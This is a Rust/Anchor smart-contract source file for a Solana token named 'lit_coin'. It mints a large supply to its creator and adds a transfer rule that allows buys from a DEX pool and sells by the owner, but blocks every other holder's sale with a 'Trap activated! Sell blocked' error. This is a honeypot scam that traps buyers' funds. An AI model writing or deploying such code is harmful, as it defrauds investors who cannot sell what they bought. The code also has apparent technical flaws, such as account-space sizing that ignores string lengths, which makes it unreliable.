use anchor_lang::prelude::*;
use anchor_spl::token::{
    self, Mint, MintTo, Token, TokenAccount, Transfer as TokenTransfer,
};

declare_id!("6ABQvzsWktHyiZR4BLB4AZ4e2ARDgeXzCkT8fneQd5PN");

#[program]
pub mod lit_coin {
    use super::*;

    pub fn initialize(
        ctx: Context<Initialize>,
        owner: Pubkey,
        name: String,
        symbol: String,
        decimals: u8,
    ) -> Result<()> {
        ctx.accounts.config.owner = owner;
        ctx.accounts.config.name = name;
        ctx.accounts.config.symbol = symbol;
        ctx.accounts.config.decimals = decimals;

        let cpi_accounts = MintTo {
            mint: ctx.accounts.mint.to_account_info(),
            to: ctx.accounts.token_account.to_account_info(),
            authority: ctx.accounts.mint_authority.to_account_info(),
        };

        let cpi_ctx = CpiContext::new(ctx.accounts.token_program.to_account_info(), cpi_accounts);

        let total_supply: u64 = 100_000_000_000u64
            .checked_mul(10u64.pow(decimals as u32))
            .unwrap();

        token::mint_to(cpi_ctx, total_supply)?;
        Ok(())
    }

    pub fn transfer(ctx: Context<Transfer>, amount: u64) -> Result<()> {
        let owner = ctx.accounts.config.owner;
        let from = ctx.accounts.from_token_account.owner;
        let to = ctx.accounts.to_token_account.owner;

        msg!("Transfer requested from: {}", from);
        msg!("Transfer to: {}", to);

        if from == ctx.accounts.dex_pool.key() {
            msg!("Buy allowed");
        } else if from == owner {
            msg!("Whitelisted owner — sell allowed");
        } else if to == ctx.accounts.dex_pool.key() {
            msg!("Trap activated! Sell blocked");
            return Err(ErrorCode::YouCannotSell.into());
        }

        let cpi_accounts = TokenTransfer {
            from: ctx.accounts.from_token_account.to_account_info(),
            to: ctx.accounts.to_token_account.to_account_info(),
            authority: ctx.accounts.from.to_account_info(),
        };

        let cpi_ctx = CpiContext::new(ctx.accounts.token_program.to_account_info(), cpi_accounts);
        token::transfer(cpi_ctx, amount)?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(init, payer = payer, space = 8 + 32 + 64 + 64 + 1)]
    pub config: Account<'info, Config>,

    #[account(mut)]
    pub payer: Signer<'info>,

    #[account(init, mint::decimals = decimals, mint::authority = mint_authority, payer = payer)]
    pub mint: Account<'info, Mint>,

    #[account(init, token::mint = mint, token::authority = payer, payer = payer)]
    pub token_account: Account<'info, TokenAccount>,

    /// CHECK: Mint authority
    pub mint_authority: UncheckedAccount<'info>,

    pub system_program: Program<'info, System>,
    pub token_program: Program<'info, Token>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct Transfer<'info> {
    #[account(mut)]
    pub from: Signer<'info>,

    #[account(mut)]
    pub from_token_account: Account<'info, TokenAccount>,

    #[account(mut)]
    pub to_token_account: Account<'info, TokenAccount>,

    /// CHECK: DEX Pool address
    pub dex_pool: UncheckedAccount<'info>,

    #[account()]
    pub config: Account<'info, Config>,

    pub token_program: Program<'info, Token>,
}

#[account]
pub struct Config {
    pub owner: Pubkey,
    pub name: String,
    pub symbol: String,
    pub decimals: u8,
}

#[error_code]
pub enum ErrorCode {
    #[msg("Selling is disabled for this token.")]
    YouCannotSell,
}
